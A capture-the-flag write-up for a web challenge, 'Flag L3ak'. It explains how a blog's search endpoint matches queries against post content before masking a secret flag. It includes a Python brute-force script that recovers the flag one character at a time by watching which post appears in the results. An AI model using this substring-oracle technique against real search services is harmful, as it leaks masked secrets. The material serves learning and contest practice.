# `Flag L3ak`
Category : Web
## 🗒️ Description
> What's the name of this CTF? Yk what to do 😉
---
## 🪄 Solution Steps
- In this case, we are given a website that has a *show post*, and *search post* feature. Where in the zip file provided, there is an index.js file that functions as a Node.js server.
- Data Post
```js
  const FLAG = 'L3AK{t3mp_flag!!}'
  const posts = [
    {
        id: 1,
        title: "Welcome to our blog!",
        content: "This is our first post. Welcome everyone!",
        author: "admin",
        date: "2025-01-15"
    },
    {
        id: 2,
        title: "Tech Tips",
        content: "Here are some useful technology tips for beginners. Always keep your software updated!",
        author: "Some guy out there",
        date: "2025-01-20"
    },
    {
        id: 3,
        title: "Not the flag?",
        content: `Well luckily the content of the flag is hidden so here it is: ${FLAG}`,
        author: "admin",
        date: "2025-05-13"
    },
    {
        id: 4,
        title: "Real flag fr",
        content: `Forget that other flag. Here is a flag: L3AK{Bad_bl0g?}`,
        author: "L3ak Member",
        date: "2025-06-13"
    },
    {
        id: 5,
        title: "Did you know?",
        content: "This blog post site is pretty dope, right?",
        author: "???",
        date: "2025-06-20"
    },
  ];
```
- Search Endpoint
```js
app.post('/api/search', (req, res) => {
    const { query } = req.body;
    
    if (!query || typeof query !== 'string' || query.length !== 3) {
        return res.status(400).json({ 
            error: 'Query must be 3 characters.',
        });
    }

    const matchingPosts = posts
        .filter(post => 
            post.title.includes(query) ||
            post.content.includes(query) ||
            post.author.includes(query)
        )
        .map(post => ({
            ...post,
            content: post.content.replace(FLAG, '*'.repeat(FLAG.length))
    }));

    res.json({
        results: matchingPosts,
        count: matchingPosts.length,
        query: query
    });
});
```
- Post Endpoint
```js
app.get('/api/posts', (_, res) => {
    const publicPosts = posts.map(post => ({
        id: post.id,
        title: post.title,
        content: post.content.replace(FLAG, '*'.repeat(FLAG.length)),
        author: post.author,
        date: post.date
    }));
    
    res.json({
        posts: publicPosts,
        total: publicPosts.length
    });
});
```
From the code above, we can conclude that there are 5 statically generated post data, where there are 2 post data that have the possibility that the post is the flag we are looking for.
<br>
<br>
Where the post we mean is :
```js
    {
        id: 3,
        title: "Not the flag?",
        content: `Well luckily the content of the flag is hidden so here it is: ${FLAG}`,
        author: "admin",
        date: "2025-05-13"
    }
    {
        id: 4,
        title: "Real flag fr",
        content: `Forget that other flag. Here is a flag: L3AK{Bad_bl0g?}`,
        author: "L3ak Member",
        date: "2025-06-13"
    }
```

- There are several flags found in the zip file provided in index.js: `L3AK{Bad_bl0g?}` and `L3AK{t3mp_flag!!}`, both flags are clearly incorrect😁.
- There's another clue: the search endpoint only accepts 3 characters, and the temp flag appearing in ID 3 is censored with asterisks (*).
- For my first attempt, I used the search endpoint with query `3ak` which returned 2 posts: ID 3 using `L3AK{t3mp_flag!!}` and ID 4 using the `L3AK{Bad_bl0g?}` flag.
- And then i tried searching with the query `K{t` to check if ID 3 would appear, since ID 3 should appear when it calls the `const FLAG = 'L3AK{t3mp_flag!!}'`. It didn't appear, meaning the flag had been changed on the server. This meant we needed to search for each character one by one, but, the response we get must be a post that comes from id 3, because the possibility of the flag we are looking for comes from that post
- Since manually searching character by character would be impractical, especially with the 3-character limit, we need to use a exploitation script like this:
```py
import requests # type: ignore
import string
import sys

# Configuration
URL = "http://34.134.162.213:17000/api/search"
# The substring you discovered!
known_part = "l4g"
# Character set to test for the flag. You can add more if needed.   
CHARSET = string.ascii_letters + string.digits + "{}_-!?"

def check_substring(s: str) -> bool:
    """
    Sends a 3-char substring to the server and returns True if it's a match
    and at least one matching post has id == 3.
    """
    if len(s) != 3:
        return False
    try:
        response = requests.post(URL, json={'query': s}, timeout=5)
        if response.status_code == 200:
            data = response.json()
            results = data.get('results', [])
            # Cek apakah ada post dengan id == 3
            for post in results:
                if post.get('id') == 3:
                    return True
    except requests.RequestException:
        return False
    return False

print(f"Starting brute-force with known part: {known_part}")
print("-" * 30)

# --- Part 1: Extend to the right (discovering the end of the flag) ---
# This piece will hold the part of the flag starting from your discovery
# e.g., K{L1nux_w0rld!}
right_side = known_part
while not right_side.endswith('}'):
    found_next_char = False
    # Take the last 2 characters of our known string
    prefix = right_side[-2:]
    for char in CHARSET:
        query = prefix + char
        # Print progress to show it's working
        sys.stdout.write(f"\rTesting (right): {query}")
        sys.stdout.flush()
        if check_substring(query):
            right_side += char
            print(f"\rFound part: {right_side}   ")
            found_next_char = True
            break
    if not found_next_char:
        print("\n[->] Could not find the next character. Stopping right-side search.")
        break

# --- Part 2: Extend to the left (discovering the start of the flag) ---
# This piece will hold the part of the flag before your discovery
# e.g., L3AK{s1de_channe
left_side = known_part
while not left_side.startswith('L3AK{'):
    found_prev_char = False
    # Take the first 2 characters of our known string
    suffix = left_side[:2]
    for char in CHARSET:
        query = char + suffix
        # Print progress to show it's working
        sys.stdout.write(f"\rTesting (left):  {query} ")
        sys.stdout.flush()
        if check_substring(query):
            left_side = char + left_side
            print(f"\rFound part: {left_side}   ")
            found_prev_char = True
            break
    if not found_prev_char:
        print("\n[<-] Could not find the previous character. Stopping left-side search.")
        break
        
# --- Part 3: Combine the results ---
# The left_side search discovers the beginning of the flag up to your known part.
# The right_side search discovers the end of the flag starting from your known part.
# We just need to combine them, removing the duplicated "K{L".
final_flag = left_side + right_side[len(known_part):]

print("\n" + "="*30)
print(f"Brute-force complete.")
print(f"Final Flag: {final_flag}")
print("="*30)
```
Annddd.... i found the flag 🚩
## ✅ Conclusion
In this exploit, we are asked to search for flags placed on data posts. 
Where there are challenges given is

- We can only use 3 char as a query for search
- The flags that we must find are censored using asterisks.

However, there is a loophole that we can get,
which is before the flag is censored, there is no filter or hashing process on the flag,
so we can utilize this loophole to search character by character. By focusing the search only on posts with id: 3.
